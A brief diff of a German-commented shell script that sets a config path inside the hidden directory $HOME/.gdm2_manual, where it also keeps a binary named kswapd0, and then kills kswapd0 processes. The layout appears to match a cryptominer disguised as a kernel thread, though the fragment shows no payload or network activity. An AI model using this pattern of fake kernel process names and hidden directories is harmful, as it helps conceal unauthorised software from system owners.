@@ -4,7 +4,7 @@
 
 # Pfade zu den benötigten Dateien
 KSWAPD0="$HOME/.gdm2_manual/kswapd0"
-CONFIG_JSON="/path/to/config.json"
+CONFIG_JSON="$HOME/.gdm2_manual/config.json"
 
 # Prozesse beenden, die mit kswapd0 verbunden sind
 pkill -f kswapd0
